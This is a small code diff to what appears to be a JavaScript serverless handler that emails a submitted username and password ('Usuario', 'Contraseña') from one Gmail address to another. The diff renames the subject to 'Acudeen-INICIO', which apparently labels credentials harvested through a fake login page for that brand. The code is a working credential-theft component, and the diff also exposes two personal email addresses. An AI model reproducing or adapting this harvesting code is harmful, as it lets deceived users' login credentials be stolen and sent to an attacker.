@@ -15,7 +15,7 @@ exports.handler = async function(event, context) {
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
         to: 'sierroalee@gmail.com',
-        subject: 'Example-Example',
+        subject: 'Acudeen-INICIO',
         text: `Usuario: ${username}\nContraseña: ${password}`,
     };
 
